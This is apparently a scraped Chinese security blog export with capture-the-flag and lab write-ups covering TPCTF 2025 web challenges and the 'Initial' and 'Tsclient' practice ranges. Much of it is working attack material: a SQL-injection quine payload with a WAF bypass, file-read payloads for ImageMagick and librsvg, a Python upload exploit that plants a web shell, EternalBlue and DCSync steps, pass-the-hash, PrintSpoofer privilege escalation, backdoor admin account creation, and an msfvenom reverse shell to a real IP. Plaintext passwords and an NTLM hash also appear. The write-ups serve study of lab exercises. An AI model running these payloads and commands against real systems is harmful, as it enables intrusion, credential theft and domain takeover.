定义了一个flag路由，指向views.py的flag函数\n跟进views\n1from django.shortcuts import render 2from django.db import connection 3 4# Create your views here. 5from django.http import HttpResponse,HttpRequest 6from .models import AdminUser,Blog 7import os 8 9def index(request:HttpRequest): 10 return HttpResponse(\u0026#39;Welcome to TPCTF 2025\u0026#39;) 11 12def flag(request:HttpRequest): 13 if request.method != \u0026#39;POST\u0026#39;: 14 return HttpResponse(\u0026#39;Welcome to TPCTF 2025\u0026#39;) 15 username = request.POST.get(\u0026#39;username\u0026#39;) 16 if username != \u0026#39;admin\u0026#39;: 17 return HttpResponse(\u0026#39;you are not admin.\u0026#39;) 18 password = request.POST.get(\u0026#39;password\u0026#39;) 19 users:AdminUser = AdminUser.objects.raw(\u0026#34;SELECT * FROM blog_adminuser WHERE username=\u0026#39;%s\u0026#39; and password =\u0026#39;%s\u0026#39;\u0026#34; % (username,password)) 20 try: 21 assert password == users[0].password 22 return HttpResponse(os.environ.get(\u0026#39;FLAG\u0026#39;)) 23 except: 24 return HttpResponse(\u0026#39;wrong password\u0026#39;) 这里存在sql注入\n所以接下来的目标就是要想办法绕过waf，进行sql注入\n可以利用multipart boundary来绕过waf，参考下面的这篇文章\nhttps://www.geekby.site/2022/03/waf-bypass/#multipart-%E6%B7%B7%E6%B7%86\n1POST /flag/ HTTP/1.1 2Host: 127.0.0.1:7788 3sec-ch-ua-mobile: ?0 4Sec-Fetch-Site: cross-site 5Upgrade-Insecure-Requests: 1 6Sec-Fetch-Dest: document 7sec-ch-ua-platform: \u0026#34;Windows\u0026#34; 8sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;134\u0026#34;, \u0026#34;Not:A-Brand\u0026#34;;v=\u0026#34;24\u0026#34;, \u0026#34;Google Chrome\u0026#34;;v=\u0026#34;134\u0026#34; 9Referer: http://mitm/ 10Sec-Fetch-Mode: navigate 11Sec-Fetch-User: ?1 12Accept-Language: zh-CN,zh;q=0.9 13User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 14Accept-Encoding: gzip, deflate, br, zstd 15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 16Content-Type: multipart/form-data; boundary=a 17 18--a 19Content-Disposition: form-data; name=\u0026#34;username\u0026#34; 20 21admin 22--a 23Content-Disposition: form-data; name=\u0026#34;password\u0026#34;;filename=\u0026#34;password\u0026#34; 24Content-Disposition: form-data; name=\u0026#34;password\u0026#34;; 25 26123 27--a-- 这题我们可以使用quine注入，即构造sql语句使我们输入和输出的结果一致，从而绕过\n1assert password == users[0].password 参考文章：\nhttps://www.cnblogs.com/meraklbz/p/18169584\n生成一个payload\n1def quine(data, debug=True): 2 if debug: 3 print(data) 4 data = data.replace(\u0026#39;$$\u0026#39;,\u0026#34;REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)\u0026#34;) 5 blob = data.replace(\u0026#39;$$\u0026#39;,\u0026#39;\u0026#34;$\u0026#34;\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\u0026#34;\u0026#39;) 6 data = data.replace(\u0026#39;$$\u0026#39;,\u0026#34;\u0026#39;\u0026#34;+blob+\u0026#34;\u0026#39;\u0026#34;) 7 if debug: 8 print (data) 9 return data 10 11data = quine(\u0026#34;1\u0026#39; union select 1,2,$$--\u0026#34;) 完整payload\n1POST /flag/ HTTP/1.1 2Host: 127.0.0.1:7788 3sec-ch-ua-mobile: ?0 4Sec-Fetch-Site: cross-site 5Upgrade-Insecure-Requests: 1 6Sec-Fetch-Dest: document 7sec-ch-ua-platform: \u0026#34;Windows\u0026#34; 8sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;134\u0026#34;, \u0026#34;Not:A-Brand\u0026#34;;v=\u0026#34;24\u0026#34;, \u0026#34;Google Chrome\u0026#34;;v=\u0026#34;134\u0026#34; 9Referer: http://mitm/ 10Sec-Fetch-Mode: navigate 11Sec-Fetch-User: ?1 12Accept-Language: zh-CN,zh;q=0.9 13User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 14Accept-Encoding: gzip, deflate, br, zstd 15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 16Content-Type: multipart/form-data; boundary=a 17 18--a 19Content-Disposition: form-data; name=\u0026#34;username\u0026#34; 20 21admin 22--a 23Content-Disposition: form-data; name=\u0026#34;password\u0026#34;;filename=\u0026#34;password\u0026#34; 24Content-Disposition: form-data; name=\u0026#34;password\u0026#34;; 25 261\u0026#39; union select 1,2,REPLACE(REPLACE(\u0026#39;1\u0026#34; union select 1,2,REPLACE(REPLACE(\u0026#34;$\u0026#34;,CHAR(34),CHAR(39)),CHAR(36),\u0026#34;$\u0026#34;)--\u0026#39;,CHAR(34),CHAR(39)),CHAR(36),\u0026#39;1\u0026#34; union select 1,2,REPLACE(REPLACE(\u0026#34;$\u0026#34;,CHAR(34),CHAR(39)),CHAR(36),\u0026#34;$\u0026#34;)--\u0026#39;)-- 27--a-- thumbor1 thumbor是一个图片处理服务工具，可以对图片进行动态调整\n附件只有一个dockerfile\n可以起个docker拿一下源码\n这题不是因为thumbor有问题，而是因为thumbor的一个组件ImageMagick存在任意文件读取漏洞，也就是CVE-2022-44268。\n去GitHub找一个POC\nvoidz0r/CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file read\n从readme可以看到这里可以通过类似ssrf的方式远程加载图片\n在vps上构造好png，远程加载即可\nhttp://localhost:8800/thumbor/unsafe/450x/YOUR_IP/图片 其实就是复现cve\nthumbor2 dockerfile里面增加了最新版的ImageMagick，其实就是修复了上一题的ImageMagick\n这题是另一个组件librsvg的漏洞，CVE-2023-38633\nlibrsvg 2.56.3 之前版本中 URL 解码器的目录遍历问题，可以被本地或远程攻击者用来泄露文件（在预期区域之外的本地文件系统上），例如通过在 xi:include 元素中使用 href=“.?../…/…/…/…/…/…/…/…/…/etc/passwd” 来读取结果。 原文链接：https://blog.csdn.net/HMX404/article/details/137231580\n原理参考文章：\nWhen URL parsers disagree (CVE-2023-38633) - Canva Engineering Blog\npayload：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;no\u0026#34;?\u0026gt; \u0026lt;svg width=\u0026#34;3000\u0026#34; height=\u0026#34;3000\u0026#34; xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34;\u0026gt; \u0026lt;rect width=\u0026#34;3000\u0026#34; height=\u0026#34;3000\u0026#34; style=\u0026#34;fill:rgb(255,255,255);\u0026#34; /\u0026gt; \u0026lt;text x=\u0026#34;0\u0026#34; y=\u0026#34;1500\u0026#34; font-size=\u0026#34;100\u0026#34;\u0026gt; \u0026lt;xi:include href=\u0026#34;.?../../../../../../../../flag\u0026#34; parse=\u0026#34;text\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;xi:fallback\u0026gt;file not found\u0026lt;/xi:fallback\u0026gt; \u0026lt;/xi:include\u0026gt; \u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; 跟上题差不多，在服务器上创建一个txt，将payload写进去，远程加载即可\nhttp://localhost:8800/thumbor/unsafe/450x/YOUR_IP/poc.txt ","permalink":"http://localhost:1313/post/tpctf_2025/","summary":"\u003cblockquote\u003e\n\u003cp\u003e参考文章\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://blog.0xfff.team/posts/tpctf_2025_writeup/\"\u003ehttps://blog.0xfff.team/posts/tpctf_2025_writeup/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://z3n1th1.com/2025/03/tpctf2025-writeup/\"\u003ehttps://z3n1th1.com/2025/03/tpctf2025-writeup/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://blog.xmcve.com/2025/03/11/TPCTF2025-Writeup/\"\u003eTPCTF2025 Writeup - 星盟安全团队\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch3 id=\"baby-layout\"\u003ebaby layout\u003c/h3\u003e\n\u003cp\u003e这是一道关于绕过DOMPurify库，进行xss cookie窃取的题目\u003c/p\u003e\n\u003cp\u003eDOMPurify 是一个专门用于清理 HTML 输入的 JavaScript 库，旨在防止跨站脚本 (XSS) 攻击。它通过过滤和净化用户提供的 HTML 内容，确保其安全地嵌入到网页中，避免恶意代码的执行。\u003c/p\u003e","title":"TPCTF2025-Web-赛后复现Writeup"},{"content":" 参考文章\nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\n菜鸡第一个通关的靶场Orz\nFLAG1 fscan扫一下\n./fscan.exe -h 39.99.139.119 直接用thinkphpgui写马连蚁剑\n先用vshell上线\n读flag需要提权\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\n传个linpeas扫一下\n./linpeas_linux_amd64 \u0026gt; output.txt 在历史文件中找到疑似读flag的命令\n其实这就是一个简单的sudo提权\n渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客\nmysql 是配置了 sudo 免密使用的，可以使用 mysql 提权，通过mysql执行命令来读flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- 接下来搭代理\n查内网ip\n接着传一个fscan扫一下内网\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 收集到的信息\n172.22.1.2:DC域控\r172.22.1.21:Windows的机器并且存在MS17-010 漏洞\r172.22.1.18:信呼OA办公系统 FLAG2 先看信呼\n弱口令成功登入admin/admin123\n信呼协同办公系统v2.2.8存在文件上传漏洞\n[Awesome-POC/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md at master · Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) 写马之后直接读flag就行\nflag02: 2ce3-4813-87d4- FLAG3 永恒之蓝可以用msf打\n现在kali上用proxychains4简单配个代理\nproxychains4 msfconsole\rsearch ms17-010 有四个不同的模块\n这里使用第一个模块，因为利用范围比较广\nuse exploit/windows/smb/ms17_010_eternalblue # 选择使用的模块\rset payload windows/x64/meterpreter/bind_tcp_uuid # 设置payload，可以通过show payloads查看\rset RHOSTS 172.22.1.21 # 设置靶机的ip\rexploit # 发起攻击 成功了\nmeterpreter \u0026gt; screenshot # 捕获屏幕\rmeterpreter \u0026gt; upload hello.txt c:// #上传文件\rmeterpreter \u0026gt; download d://1.txt # 下载文件\rmeterpreter \u0026gt; shell # 获取cmd\rmeterpreter \u0026gt; clearev # 清除日志 load kiwi # 调用mimikatz模块\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # 导出域内所有用户的信息(包括哈希值) 拿到Administrator 用户的 hash，接着使用 crackmapexec 来进行哈希传递攻击，来实现 DC域控 上的任意命令执行\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; 拿到最后一个flag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003e参考文章\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e菜鸡第一个通关的靶场Orz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"../assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscan扫一下\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"../assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接用thinkphpgui写马连蚁剑\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"../assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先用vshell上线\u003c/p\u003e\n\u003cp\u003e读flag需要提权\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"春秋云镜-Initial-Writeup"},{"content":"Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\n参考文章\n春秋云镜 TSclient \u0026ndash; Walkthrough - KingBridge - 博客园\n春秋云境 Tsclient | 初零·b10g~🥝\nFLAG1 先用fscan扫一下\nmssql服务是弱口令\nsa/1qaz!QAZ 用数据库管理工具连上去\n接下来要看mssql怎么进行命令执行\n参考文章：\nhttps://xz.aliyun.com/news/7129\n判断xp_cmdshell状态\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; 存在\n那我们接下来启动它\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; 配置选项 \u0026#39;xp_cmdshell\u0026#39; 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。 启动成功\n接下来就可以进行命令执行了\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; 接下来直接vshell一句话上线\n没找到flag，发现Administrator文件夹没有权限\n想到要提权，传一个PrintSpoofer进行提权\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd 提权之后拿到flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... 提权之后用提权后的账户重新上一下线\n接下来用fscan扫一下内网\n1┌──────────────────────────────────────────────┐ 2│ ___ _ │ 3│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 4│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 5│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 6│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 7└──────────────────────────────────────────────┘ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] 暴力破解线程数: 1 11[2025-03-09 19:53:19] [INFO] 开始信息扫描 12[2025-03-09 19:53:19] [INFO] CIDR范围: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] 生成IP范围: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] 解析CIDR 172.22.8.0/24 -\u0026gt; IP范围 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] 最终有效主机数量: 256 16[2025-03-09 19:53:20] [INFO] 开始主机扫描 17[2025-03-09 19:53:20] [INFO] 正在尝试无监听ICMP探测... 18[2025-03-09 19:53:20] [INFO] 当前用户权限不足,无法发送ICMP包 19[2025-03-09 19:53:20] [INFO] 切换为PING方式探测... 20[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.31 存活 (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.18 存活 (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.15 存活 (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.46 存活 (ICMP) 24[2025-03-09 19:53:23] [INFO] 存活主机数量: 4 25[2025-03-09 19:53:23] [INFO] 有效端口数量: 233 26[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] 端口开放 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] 服务识别 172.22.8.18:1433 =\u0026gt; [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] 服务识别 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] 存活端口数量: 17 61[2025-03-09 19:54:30] [INFO] 开始漏洞扫描 62[2025-03-09 19:54:30] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 64目标主机: 172.22.8.18 65主机名: WIN-WEB 66发现的网络接口: 67 IPv4地址: 68 └─ 172.22.8.18 69 IPv6地址: 70 └─ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 73目标主机: 172.22.8.15 74主机名: DC01 75发现的网络接口: 76 IPv4地址: 77 └─ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 79目标主机: 172.22.8.46 80主机名: WIN2016 81发现的网络接口: 82 IPv4地址: 83 └─ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 85目标主机: 172.22.8.31 86主机名: WIN19-CLIENT 87发现的网络接口: 88 IPv4地址: 89 └─ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.46 状态码:200 长度:703 标题:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.18 状态码:200 长度:703 标题:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] 扫描已完成: 32/32 扫到三台机子\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 没有什么能直接利用的服务\n那我们接着信息收集一下\nnet user 主机名: WIN-WEB\rOS 名称: Microsoft Windows Server 2016 Datacenter\rOS 版本: 10.0.14393 暂缺 Build 14393\rOS 制造商: Microsoft Corporation\rOS 配置: 独立服务器\rOS 构件类型: Multiprocessor Free\r注册的所有人:\r注册的组织: Aliyun\r产品 ID: 00376-40000-00000-AA947\r初始安装日期: 2022/7/11, 12:46:14\r系统启动时间: 2025/3/9, 18:28:29\r系统制造商: Alibaba Cloud\r系统型号: Alibaba Cloud ECS\r系统类型: x64-based PC\r处理器: 安装了 1 个处理器。\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS 版本: SeaBIOS 449e491, 2014/4/1\rWindows 目录: C:\\Windows\r系统目录: C:\\Windows\\system32\r启动设备: \\Device\\HarddiskVolume1\r系统区域设置: zh-cn;中文(中国)\r输入法区域设置: zh-cn;中文(中国)\r时区: (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐\r物理内存总量: 3,950 MB\r可用的物理内存: 883 MB\r虚拟内存: 最大值: 5,848 MB\r虚拟内存: 可用: 1,169 MB\r虚拟内存: 使用中: 4,679 MB\r页面文件位置: C:\\pagefile.sys\r域: WORKGROUP\r登录服务器: 暂缺\r修补程序: 安装了 6 个修补程序。\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\r网卡: 安装了 1 个 NIC。\r[01]: Red Hat VirtIO Ethernet Adapter\r连接名: 以太网\r启用 DHCP: 是\rDHCP 服务器: 172.22.255.253\rIP 地址\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V 要求: 已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。 C:\\Tmp\u0026gt;net user\r\\\\ 的用户帐户\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\r命令运行完毕，但发生一个或多个错误。 C:\\Tmp\u0026gt;quser\r用户名 会话名 ID 状态 空闲时间 登录时间\rjohn rdp-tcp#0 2 运行中 2:38 2025/3/9 18:30 发现一个john用户远程连接本台机子\n为了方便可以新建一个用户rdp连上去\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\r命令成功完成。\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\r命令成功完成。\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\r操作成功完成。 管理员权限可以偷RDP用户的token，从而查看其挂载的盘。\n这里可以用msf的incognito模块\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe 先用msf上个线\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit 上线\n接着用incognito模块偷John的token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available 可以看到已经拿到John的token了\n以John的身份运行cmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use 看一下挂载情况（不知道为啥我这乱码了）\n挂载了c盘\n查看c盘中的credential.txt文件\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? 